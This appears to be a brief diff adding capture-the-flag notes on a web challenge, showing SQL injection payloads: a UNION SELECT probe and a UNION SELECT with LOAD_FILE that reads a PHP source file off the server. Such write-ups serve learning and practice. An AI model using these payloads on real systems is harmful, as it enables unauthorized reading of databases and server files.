@@ -1,0 +1,9 @@
+The hint we have is the flag validity checker.
+It must be in the code or something...
+
+We still can see our queries' result with UNION.
+
+z'UNION SELECT 1,2,3#
+
+z'UNION SELECT 1,LOAD_FILE(CONCAT('/var/www/html/chal0',3*3,'.php')),3#
+
